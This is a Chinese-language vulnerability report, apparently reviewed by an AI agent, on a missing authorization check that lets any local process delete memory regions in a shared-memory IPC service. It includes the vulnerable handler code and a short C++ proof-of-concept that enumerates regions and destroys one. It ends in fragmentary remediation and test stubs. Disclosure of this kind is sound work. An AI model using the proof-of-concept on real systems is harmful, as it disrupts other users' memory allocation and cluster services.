## Codex 二次确认补充

- 结论：属实，但严重度依赖产品权限模型；若 region 删除本来只允许创建者/管理员，则当前缺少授权校验。

## 漏洞描述

`RegionDestroyRegion` 函数允许**任意本地进程销毁内存区域 (Region)**，但完全缺乏授权检查：
- 无所有权验证（谁创建的 Region）
- 无权限检查（是否有权删除）
- 无 uid/gid 特权验证
- 无区域存在状态验证

Region 定义集群拓扑结构，包含内存分配的位置信息。恶意用户可删除其他用户创建的 Region，导致：
1. **拓扑结构破坏**：集群内存分配策略失效
2. **其他用户内存分配失败**：依赖该 Region 的分配请求失败
3. **系统稳定性下降**：关键 Region 被删除导致服务异常

## 攻击路径分析

### 完整调用链

```
┌─────────────────────────────────────────────────────────────────┐
│  1. 入口点: IPC Socket (Unix Domain Socket)                      │
│     路径: /var/run/ubs_mem/mem_shm                              │
│     IPC 操作码: IPC_DESTROY_REGION                               │
│     消息类型: ShmDestroyRegionRequest                            │
│     参数: regionName (指定要删除的区域名称)                        │
├─────────────────────────────────────────────────────────────────┤
│  2. IPC Server Dispatch                                          │
│     mxm_shm/ipc_server.cpp                                       │
│     IPC_DESTROY_REGION → RegionDestroyRegion                    │
├─────────────────────────────────────────────────────────────────┤
│  3. RegionDestroyRegion (ipc_handler.cpp:879-913)                │
│     ⚠️ Line 896: DeleteRegionInfo(regionName) - 无授权检查!       │
│     仅验证参数非空，不验证所有权或权限                              │
├─────────────────────────────────────────────────────────────────┤
│  4. RegionManager::DeleteRegionInfo (region_manager.cpp)         │
│     从持久化存储中删除 Region 信息                                │

└─────────────────────────────────────────────────────────────────┘
```

### 数据流

```
IPC Request: ShmDestroyRegionRequest
  └── request->regionName_ (攻击者指定任意区域名)
        └── RegionDestroyRegion
              ├── udsInfo.uid/gid/pid (仅日志，不验证)
              └── RegionManager::GetInstance().DeleteRegionInfo(regionName_)
                    └── Region 被删除
                          └── 所有依赖该 Region 的内存分配失败
                          └── 集群拓扑结构被破坏
```

### 关键代码分析

```cpp
// src/mxm_shm/ipc_handler.cpp:879-913
int MxmServerMsgHandle::RegionDestroyRegion(const MsgBase* req, MsgBase* rsp, const MxmComUdsInfo& udsInfo)
{
    if (req == nullptr || rsp == nullptr) {
        return MXM_ERR_NULLPTR;  // 仅检查参数
    }
    auto request = dynamic_cast<const ShmDestroyRegionRequest*>(req);
    auto response = dynamic_cast<ShmDestroyRegionResponse*>(rsp);
    if (request == nullptr || response == nullptr) {
        return MXM_ERR_NULLPTR;
    }

    // ⚠️ 警告：此处应该验证权限！
    // 1. 检查调用者是否是 Region 的创建者
    // 2. 或检查调用者是否有管理员权限
    // 但代码中完全没有权限检查！

    DBG_AUDITINFO("user info of RegionDestroyRegion, uid=" << udsInfo.uid 
                  << ", gid=" << udsInfo.gid << ", pid=" << udsInfo.pid 
                  << ", region_name=" << request->regionName_);
    
    // 仅记录日志，不用于权限判断

    DBG_LOGINFO("Start to delete region info successfully, region_name=" << request->regionName_);
    
    // ⚠️ 直接删除，任何人都可以删除任何 Region！
    TP_TRACE_BEGIN(TP_UBSM_DESTORY_REGION);
    auto ret = ock::share::service::RegionManager::GetInstance().DeleteRegionInfo(request->regionName_);
    TP_TRACE_END(TP_UBSM_DESTORY_REGION, ret);

    if (!ret) {
        response->errCode_ = MXM_ERR_REGION_NOT_EXIST;
        return ret;
    }

    response->errCode_ = 0;
    return 0;  // 成功删除，攻击完成
}
```

## 触发条件

### 前置条件

| 条件 | 说明 | 难度 |
|------|------|------|
| **IPC Socket 访问** | 能连接到 `/var/run/ubs_mem/mem_shm` | ⭐ Easy |
| **本地进程** | Unix Domain Socket 仅支持本地连接 | ⭐ Easy |
| **Region 名称已知** | 需知道要删除的 Region 名称 | ⭐ Easy (可枚举) |
| **无特权要求** | **任何本地用户均可调用** | ⭐ Easy |

### Region 名称获取方式

攻击者可以通过以下方式获取 Region 名称：

1. **枚举现有 Region**：

```cpp
// 使用 RegionLookupRegionList 获取所有 Region
ShmLookupRegionListRequest request;
ShmLookupRegionListResponse response;
// 返回所有 Region 名称列表
// 无权限检查，任何人都可以查询
```

2. **猜测常见名称**：
   - "default" - 默认区域
   - "region_0", "region_1" - 常见命名模式
   - 基于集群配置猜测

### 攻击步骤

```cpp
// 攻击代码示例
#include "mxmem_shm.h"

int main() {
    auto shm = MxMemShm::GetInstance();
    
    // 1. 先枚举所有 Region（无权限检查）
    ShmLookupRegionListRequest listReq;
    ShmLookupRegionListResponse listResp;
    shm->LookupRegionList(listReq, listResp);
    
    // 2. 选择要删除的目标 Region
    std::string targetRegion = listResp.regions_[0].regionName_;  // 或 "default"
    
    // 3. 构造删除请求
    ShmDestroyRegionRequest request;
    request.regionName_ = targetRegion;  // 任意 Region 都可以删除
    
    // 4. 发送 IPC 消息
    auto ret = shm->DestroyRegion(request);
    
    // ⚠️ 成功！目标 Region 被删除
    // 其他用户依赖该 Region 的操作失败
    
    return 0;
}
```

### 影响范围

- **单节点**：影响当前节点上所有使用该 Region 的进程
- **多节点**：如果 Region 定义跨节点拓扑，影响整个集群
- **持久性**：Region 信息持久化存储，删除后需重新创建

1. **引用计数机制**：
   - 删除前检查 Region 是否正在被使用

TEST(RegionDestroyRegion, RejectNonCreator) {

    // 用户B尝试删除
